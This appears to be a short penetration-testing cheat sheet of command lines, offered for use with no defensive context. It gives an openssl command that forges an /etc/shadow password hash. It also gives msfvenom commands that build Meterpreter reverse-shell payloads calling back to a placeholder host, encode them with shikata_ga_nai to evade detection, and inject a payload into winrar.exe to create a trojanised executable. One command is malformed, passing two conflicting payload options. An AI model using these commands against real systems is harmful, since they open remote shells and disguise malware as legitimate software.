# Utils

## Password Crack and Hash

### Create password for /etc/shadow file

```bash
openssl passwd -1 -salt abc PASS
```



## Msfvenom

### Generating Payloads

```bash
# list of payload
msfvenom --list payloads

# create a payload 
msfvenom -p x64 -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > file.elf
```

### Encoding Payloads

```bash
# list groups of encoders
msfvenom --list encoders

# create windows encode payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -f exe > file.exe
# -i: to add iterations

# create linux encode payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -f elf > file.elf
# -i: to add iterations

```

### Injecting Payload Into Windows Portable Executables

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -i 10 -f exe -k -x winrar.exe > file.exe
```
{% endcode %}
